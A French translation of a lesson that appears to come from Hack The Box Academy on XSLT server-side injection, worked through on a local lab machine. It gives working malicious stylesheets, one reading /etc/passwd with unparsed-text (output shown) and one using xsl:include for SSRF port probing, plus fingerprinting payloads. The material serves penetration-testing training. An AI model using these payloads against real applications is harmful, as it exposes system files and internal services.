Attaquer XSLT
=============

* * * * *

Extensible Stylesheet Language Transformations ( `XSLT`) est un langage basé sur XML généralement utilisé lors de la transformation de documents XML en HTML, un autre document XML ou PDF. Transformations extensibles du langage de feuille de style L'injection côté serveur peut se produire lorsqu'un téléchargement de fichier XSLT arbitraire est possible ou lorsqu'une application génère dynamiquement le document XML de la transformation XSL à l'aide d'une entrée non validée de l'utilisateur.

Selon les cas, XSLT utilise des fonctions intégrées et le langage XPATH pour transformer un document soit dans le navigateur soit sur le serveur. Les transformations de langage de feuille de style extensible sont présentes dans certaines applications Web en tant que fonctionnalités autonomes, moteurs SSI et bases de données comme Oracle. Au moment de la rédaction, il existe 3 ( [1](https://www.w3.org/TR/xslt-10/) , [2](https://www.w3.org/TR/xslt20/) , [3](https://www.w3.org/TR/xslt-30/) ) versions XSLT. La version 1 est la moins intéressante du point de vue d'un attaquant en raison de la fonctionnalité intégrée limitée. Les projets liés à XSLT les plus utilisés sont LibXSLT, Xalan et Saxon. Pour exploiter les injections XSLT, nous devons stocker des balises malveillantes côté serveur et accéder à ce contenu.

Essayons XSLT en utilisant une combinaison de Saxon avec XSLT Version 2.

Tout d'abord, installez les packages requis sur Pwnbox ou une VM locale, comme suit :

#### Installation des packages requis

  Installation des packages requis

```
dsgsec@htb[/htb]$ sudo apt install default-jdk libsaxon-java libsaxonb-java

```

Créez ensuite les fichiers suivants :

#### catalogue.xml

Code : xml

```
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
  <cd>
    <title>Empire Burlesque</title>
    <artist>Bob Dylan</artist>
    <country>USA</country>
    <company>Columbia</company>
    <price>10.90</price>
    <year>1985</year>
  </cd>
  <cd>
    <title>Hide your heart</title>
    <artist>Bonnie Tyler</artist>
    <country>UK</country>
    <company>CBS Records</company>
    <price>9.90</price>
    <year>1988</year>
  </cd>
  <cd>
    <title>Greatest Hits</title>
    <artist>Dolly Parton</artist>
    <country>USA</country>
    <company>RCA</company>
    <price>9.90</price>
    <year>1982</year>
  </cd>
  <cd>
    <title>Still got the blues</title>
    <artist>Gary Moore</artist>
    <country>UK</country>
    <company>Virgin records</company>
    <price>10.20</price>
    <year>1990</year>
  </cd>
  <cd>
    <title>Eros</title>
    <artist>Eros Ramazzotti</artist>
    <country>EU</country>
    <company>BMG</company>
    <price>9.90</price>
    <year>1997</year>
  </cd>
  <cd>
    <title>One night only</title>
    <artist>Bee Gees</artist>
    <country>UK</country>
    <company>Polydor</company>
    <price>10.90</price>
    <year>1998</year>
  </cd>
  <cd>
    <title>Sylvias Mother</title>
    <artist>Dr.Hook</artist>
    <country>UK</country>
    <company>CBS</company>
    <price>8.10</price>
    <year>1973</year>
  </cd>
  <cd>
    <title>Maggie May</title>
    <artist>Rod Stewart</artist>
    <country>UK</country>
    <company>Pickwick</company>
    <price>8.50</price>
    <year>1990</year>
  </cd>
  <cd>
    <title>Romanza</title>
    <artist>Andrea Bocelli</artist>
    <country>EU</country>
    <company>Polydor</company>
    <price>10.80</price>
    <year>1996</year>
  </cd>
  <cd>
    <title>When a man loves a woman</title>
    <artist>Percy Sledge</artist>
    <country>USA</country>
    <company>Atlantic</company>
    <price>8.70</price>
    <year>1987</year>
  </cd>
  <cd>
    <title>Black angel</title>
    <artist>Savage Rose</artist>
    <country>EU</country>
    <company>Mega</company>
    <price>10.90</price>
    <year>1995</year>
  </cd>
  <cd>
    <title>1999 Grammy Nominees</title>
    <artist>Many</artist>
    <country>USA</country>
    <company>Grammy</company>
    <price>10.20</price>
    <year>1999</year>
  </cd>
  <cd>
    <title>For the good times</title>
    <artist>Kenny Rogers</artist>
    <country>UK</country>
    <company>Mucik Master</company>
    <price>8.70</price>
    <year>1995</year>
  </cd>
  <cd>
    <title>Big Willie style</title>
    <artist>Will Smith</artist>
    <country>USA</country>
    <company>Columbia</company>
    <price>9.90</price>
    <year>1997</year>
  </cd>
  <cd>
    <title>Tupelo Honey</title>
    <artist>Van Morrison</artist>
    <country>UK</country>
    <company>Polydor</company>
    <price>8.20</price>
    <year>1971</year>
  </cd>
  <cd>
    <title>Soulsville</title>
    <artist>Jorn Hoel</artist>
    <country>Norway</country>
    <company>WEA</company>
    <price>7.90</price>
    <year>1996</year>
  </cd>
  <cd>
    <title>The very best of</title>
    <artist>Cat Stevens</artist>
    <country>UK</country>
    <company>Island</company>
    <price>8.90</price>
    <year>1990</year>
  </cd>
  <cd>
    <title>Stop</title>
    <artist>Sam Brown</artist>
    <country>UK</country>
    <company>A and M</company>
    <price>8.90</price>
    <year>1988</year>
  </cd>
  <cd>
    <title>Bridge of Spies</title>
    <artist>T`Pau</artist>
    <country>UK</country>
    <company>Siren</company>
    <price>7.90</price>
    <year>1987</year>
  </cd>
  <cd>
    <title>Private Dancer</title>
    <artist>Tina Turner</artist>
    <country>UK</country>
    <company>Capitol</company>
    <price>8.90</price>
    <year>1983</year>
  </cd>
  <cd>
    <title>Midt om natten</title>
    <artist>Kim Larsen</artist>
    <country>EU</country>
    <company>Medley</company>
    <price>7.80</price>
    <year>1983</year>
  </cd>
  <cd>
    <title>Pavarotti Gala Concert</title>
    <artist>Luciano Pavarotti</artist>
    <country>UK</country>
    <company>DECCA</company>
    <price>9.90</price>
    <year>1991</year>
  </cd>
  <cd>
    <title>The dock of the bay</title>
    <artist>Otis Redding</artist>
    <country>USA</country>
    <company>Stax Records</company>
    <price>7.90</price>
    <year>1968</year>
  </cd>
  <cd>
    <title>Picture book</title>
    <artist>Simply Red</artist>
    <country>EU</country>
    <company>Elektra</company>
    <price>7.20</price>
    <year>1985</year>
  </cd>
  <cd>
    <title>Red</title>
    <artist>The Communards</artist>
    <country>UK</country>
    <company>London</company>
    <price>7.80</price>
    <year>1987</year>
  </cd>
  <cd>
    <title>Unchain my heart</title>
    <artist>Joe Cocker</artist>
    <country>USA</country>
    <company>EMI</company>
    <price>8.20</price>
    <year>1987</year>
  </cd>
</catalog>

```

#### transformation.xsl

Code : xml

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>
    <h2>My CD Collection</h2>
    <table border="1">
      <tr bgcolor="#9acd32">
        <th>Title</th>
        <th>Artist</th>
      </tr>
      <tr>
        <td><xsl:value-of select="catalog/cd/title"/></td>
        <td><xsl:value-of select="catalog/cd/artist"/></td>
      </tr>
    </table>
  </body>
  </html>
</xsl:template>
</xsl:stylesheet>

```

Nous devons comprendre le format XSLT pour voir comment la transformation fonctionne.

-   La première ligne est généralement la version XML et l'encodage
-   Ensuite, il aura le nœud racine XSL`xsl:stylesheet`
-   Ensuite, nous aurons les directives dans `xsl:template match="<PATH>"`. Dans ce cas, il s'appliquera à n'importe quel nœud XML.
-   Après cela, la transformation est définie pour tout élément de la structure XML correspondant à la ligne précédente.
-   Pour sélectionner certains éléments du document XML, le langage XPATH est utilisé sous la forme de `<xsl:value-of select="<NODE>/<SUBNODE>/<VALUE>"/>`.

Pour voir les résultats, nous allons utiliser l'analyseur de ligne de commande. Cela peut être fait comme suit:

#### Transformation par le terminal

  Transformation par le terminal

```
dsgsec@htb[/htb]$ saxonb-xslt -xsl:transformation.xsl catalogue.xml

Warning: at xsl:stylesheet on line 3 column 50 of transformation.xslt:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<html>
   <body>
      <h2>My CD Collection</h2>
      <table border="1">
         <tr bgcolor="#9acd32">
            <th>Title</th>
            <th>Artist</th>
         </tr>
         <tr>
            <td>Empire Burlesque</td>
            <td>Bob Dylan</td>
         </tr>
      </table>
   </body>
</html>

```

Le fichier suivant peut être utilisé pour détecter le préprocesseur sous-jacent.

#### détection.xsl

Code : xml

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html"/>
<xsl:template match="/">
    <h2>XSLT identification</h2>
    <b>Version:</b> <xsl:value-of select="system-property('xsl:version')"/><br/>
    <b>Vendor:</b> <xsl:value-of select="system-property('xsl:vendor')" /><br/>
    <b>Vendor URL:</b><xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
</xsl:template>
</xsl:stylesheet>

```

Exécutons maintenant la commande précédente, mais cette fois, en utilisant le fichier detection.xsl.

#### Transformation par le terminal

  Transformation par le terminal

```
dsgsec@htb[/htb]$ saxonb-xslt -xsl:detection.xsl catalogue.xml

Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b>http://www.saxonica.com/<br>

```

Sur la base du préprocesseur, nous pouvons consulter la documentation XSLT de cette version pour identifier les fonctions intéressantes, telles que celles ci-dessous.

-   `unparsed-text`peut être utilisé pour lire des fichiers locaux.

#### readfile.xsl

Code : xml

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>

```

#### Transformation par le terminal

  Transformation par le terminal

```
dsgsec@htb[/htb]$ saxonb-xslt -xsl:readfile.xsl catalogue.xml

Warning: at xsl:stylesheet on line 1 column 111 of readfile.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<?xml version="1.0" encoding="UTF-8"?>root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
<SNIP>

```

-   `xsl:include`peut être utilisé pour effectuer SSRF

Nous pouvons également monter des attaques SSRF si nous contrôlons la transformation.

#### ssrf.xsl

Code : xml

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:5000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>

```

#### Transformation par le terminal

  Transformation par le terminal

```
dsgsec@htb[/htb]$ saxonb-xslt -xsl:ssrf.xsl catalogue.xml

Warning: at xsl:stylesheet on line 1 column 111 of ssrf.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
Error at xsl:include on line 2 column 49 of ssrf.xsl:
  XTSE0165: java.io.FileNotFoundException: http://127.0.0.1:5000/xslt
Failed to compile stylesheet. 1 error detected.

```

  Transformation par le terminal

```
dsgsec@htb[/htb]$ saxonb-xslt -xsl:ssrf.xsl catalogue.xml

Warning: at xsl:stylesheet on line 1 column 111 of ssrf.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
Error at xsl:include on line 2 column 49 of ssrf.xsl:
  XTSE0165: java.net.ConnectException: Connection refused (Connection refused)
Failed to compile stylesheet. 1 error detected.

```

Vérifiez les différentes réponses ci-dessus lorsque nous atteignons un port ouvert ou fermé. Si vous voulez essayer cela vous-même dans Pwnbox ou sur une machine locale, essayez d'exécuter la `saxonb-xslt`commande ci-dessus une fois sans rien écouter sur le port 5000 et une fois avec un serveur HTTP écoutant sur le port 5000 ( `sudo python3 -m http.server 5000`dans un onglet ou un terminal séparé).

Nous avons présenté quelques fichiers XSL d'identification de pile technologique au début de cette section. Ci-dessous, un de plus, plus grand que les précédents. Essayez de l'utiliser pour reproduire l'exemple ci-dessus.

#### empreintes digitales.xsl

Code : xml

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
 <xsl:if test="system-property('xsl:product-name')">
 Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:product-version')">
 Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:is-schema-aware')">
 Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-serialization')">
 Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
 Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
 </xsl:if>
</xsl:template>
</xsl:stylesheet>

```

#### Transformation par le terminal

  Transformation par le terminal

```
dsgsec@htb[/htb]$ saxonb-xslt -xsl:fingerprinting.xsl catalogue.xml

Warning: at xsl:stylesheet on line 2 column 80 of fingerprinting.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<?xml version="1.0" encoding="UTF-8"?>
 Version: 2.0<br/>
 Vendor: SAXON 9.1.0.8 from Saxonica<br/>
 Vendor URL: http://www.saxonica.com/<br/>
 Product Name: SAXON<br/>
 Product Version: 9.1.0.8<br/>
 Is Schema Aware ?: no<br/>
 Supports Serialization: <br/>
 Supports Backwards Compatibility: <br/>

```

[Nous pouvons également utiliser la liste de mots](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt) suivante pour les fonctionnalités de force brute disponibles dans les applications cibles.

[Précédent](https://academy.hackthebox.com/module/145/section/1343)

Marquer terminé et suivant

[Suivant](https://academy.hackthebox.com/module/145/section/1346)

Aide-mémoire
